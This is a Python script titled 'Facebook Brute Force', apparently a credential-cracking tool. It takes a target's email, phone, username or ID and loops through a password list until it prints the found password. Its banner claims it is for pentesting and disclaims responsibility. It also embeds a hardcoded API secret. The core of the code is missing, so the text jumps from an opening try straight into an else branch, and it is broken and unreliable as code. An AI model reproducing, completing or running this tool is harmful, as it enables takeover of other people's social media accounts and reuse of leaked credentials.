## fbbrute.py - Facebook Brute Force
# -*- coding: utf-8 -*-
##
import os
import sys
import urllib
import hashlib

API_SECRET = "62f8ce9f74b12f84c123cc23437a4a32"

__banner__ = """
       +=======================================+
       |..........Facebook Cracker v 1.........|
       +---------------------------------------+
       |#Author: DedSecTL <dtlily>             |
       |#Contact: Telegram @dtlily             |
       |#Date: Fri Feb 8 10:15:49 2019         |
       |#This tool is made for pentesting.     |
       |#Changing the description of this tool |
       |Won't made you the coder ^_^ !!!       |
       |#Respect Coderz ^_^                    |
       |#I take no responsibilities for the    |
       |  use of this program !                |
       +=======================================+
       |..........Facebook Cracker v 1.........|
       +---------------------------------------+
"""

print("[+] Facebook Brute Force\n")
userid = raw_input("[*] Enter [Email|Phone|Username|ID]: ")
try:

			else:
				print("\n\n[+] Password found .. !!")
				print("\n[+] Password : {}".format(passwd.strip()))
				break
		print("\n\n[!] Done .. !!")
	else:
		print("fbbrute: error: No such file or directory")
except KeyboardInterrupt:
	print("fbbrute: error: Keyboard interrupt")
